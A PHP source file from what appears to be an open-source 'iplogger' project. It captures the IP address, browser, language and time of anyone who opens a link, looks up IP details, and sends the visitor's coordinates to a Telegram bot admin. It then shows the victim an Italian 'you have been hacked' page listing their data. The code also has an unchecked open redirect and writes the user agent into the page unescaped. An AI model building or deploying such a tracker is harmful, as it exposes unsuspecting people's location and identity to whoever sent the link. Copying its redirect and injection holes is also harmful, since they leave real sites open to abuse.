<?php


/*
    iplogger - receive on telegram the ip info and the location of the user who clicked the link
    Copyright (C) 2018  91DarioDev github.com/91DarioDev

    iplogger is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License as published
    by the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    iplogger is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.

    You should have received a copy of the GNU Affero General Public License
    along with iplogger.  If not, see <http://www.gnu.org/licenses/>.
*/


require('telegramapi.php');
require('config.php');
require('ipapi.php');
require('tinyurlapi.php');

if (!empty($_GET['redir'])){
	header('Location: '.$_GET['redir']);
} else {

    $ip = $_SERVER['REMOTE_ADDR'];
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $accept=$_SERVER['HTTP_ACCEPT_LANGUAGE'];
    $today = date("l, F j, Y, g:i a") ;
    $script_url = $_SERVER['SCRIPT_URI'];
    
    $message = "
    Ip: $ip
    Browser: $userAgent
    Lingua: $accept
    Giorno & Ora : $today
    Url: $script_url
    ";

    $res = get_ip_info($ip);

    if ($res !== null){
        $message .= "\n<b>Info ip:</b>\n";
        foreach($res as $key => $value){  
            $message .= $key.": ".$value."\n";  
        }
    }
    $message .= "source code: https://github.com/91DarioDev/iplogger";

	echo '<html>
  <head>
  	<title></title>
  </head>
  <body>
  	<div align="center" style="background-color:black">
  	<font color="lightgreen" size="6">
  	<h1>SEI STATO HACKERATO: </h1>
    <hr width="50%" />
    <h2>ecco i tuoi dati: </h2>
    '.nl2br($message).'
    <hr width="50%"/>
    <h3>Inviaci un commento</h3>
    <form action="comment.php" method="get"> 
    	Nome: <input type="text" name="nome" /><br />
        Commento: <textarea name="commento"></textarea><br />
        <input type="submit" name="invia" value="invia" /><br />
    </form>
    </font>
    </div>
  </body>
</html>';
}


sendLocation(
  $bot_admin_id, 
  (float)$_GET['lat'], 
  (float)$_GET['lon'],
  null,
  false,
  (int)$_GET['mid']
);

?>
